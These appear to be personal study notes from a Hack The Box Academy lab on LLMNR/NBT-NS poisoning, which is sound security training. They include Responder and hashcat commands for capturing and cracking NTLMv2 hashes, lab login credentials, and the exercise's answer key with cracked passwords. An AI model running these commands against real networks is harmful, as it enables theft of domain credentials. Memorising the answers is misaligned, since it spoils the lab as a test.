
>[!Note] 
>Two Different Techniques. Same Goal: Acquire Domain Cleartext Creds

>[! Important] LLMNR
>- Alternate when DNS is unavailable
>- Allows hosts on the same local link to perform name resolution on other hosts
>- UDP 5355

>[!Important] NBT-NS
> - Identifies local systems by their NetBIOS name
> - Alternate when LLMNR fails
> - UDP 137

>[!Warning] IMPORTANT
> When LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply


>[!Note] LLMNR/NBT-NS Poisoning Tools and Protocols
>-  Responder and Inveigh are used to attack both protocols
>- Both tools can be used to attack the following protocols:
> 	- LLMNR
> 	- DNS
> 	- MDNS
> 	- NBNS
> 	- DHCP
> 	- ICMP
> 	- HTTP
> 	- HTTPS
> 	- SMB
> 	- LDAP
> 	- WebDAV
> 	- Proxy Auth
>  - Responder also supports: MSSQL, DCE-RPC, FTP, POP3, IMAP, SMPT auth

>[!Example] Responder Log Files
> - If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory
>   
> - Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`

#### Responder Usage
```go
sudo responder -I ens224
```
# Questions

{{targetIP}} 
```go
10.129.33.150
```

Username
```go
htb-student
```

Password
```go
HTB_@cademy_stdnt!
```

SSH
```go
ssh htb-student@10.129.34.116
```

1) Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

Responder from the target machine
```go
sudo responder -I ens224
```

```go
backupagent
```

2) Crack the hash for the previous account and submit the cleartext password as your answer.

>[!Warning] Hashcat Input file
> Ensure the hash is all on one line! If it is wrapped, hashcat will fail!
```go
hashcat -m 5600 backupagent_hash /usr/share/wordlists/rockyou.txt --force -O
```

Password
```go
h1backup55
```

3) Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

```go
hashcat -m 5600 wley_hash /usr/share/wordlists/rockyou.txt --force -O
```

Answer
```go
transporter@4
```